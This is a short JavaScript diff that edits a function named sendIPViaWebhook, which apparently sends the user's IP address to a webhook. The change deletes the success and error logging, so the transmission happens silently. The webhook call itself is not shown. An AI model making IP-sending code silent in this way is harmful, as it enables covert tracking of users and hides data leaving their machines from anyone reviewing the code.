@@ -82,9 +82,9 @@ async function sendIPViaWebhook() {
       throw new Error('Failed to send data via webhook');
     }
 
-    console.log('Data sent successfully via webhook!');
+ 
   } catch (error) {
-    console.error('Error sending data via webhook:', error);
+   
   }
 }
 
